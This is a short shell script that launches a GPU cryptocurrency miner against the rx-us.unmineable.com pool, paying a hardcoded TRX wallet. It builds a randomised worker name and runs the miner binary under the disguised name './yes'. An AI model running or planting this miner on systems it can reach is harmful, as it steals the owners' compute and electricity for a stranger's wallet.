POOL=rx-us.unmineable.com:3333
WALLET=TRX:TBFYse7y4d3sFpdjpumnJu7iusqrRpt28H
GPU=$(nvidia-smi --query-gpu=gpu_name --format=csv > nvidia.txt && echo "$(tail -n +2 "nvidia.txt")" > "nvidia.txt" && str=$(cat nvidia.txt) && echo ${str// /_})
WORKER=$(echo Ztf8xpJF-$(shuf -i 1911-959919 -n 1))
ALGO=wrkzcoin
./yes --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableCPU
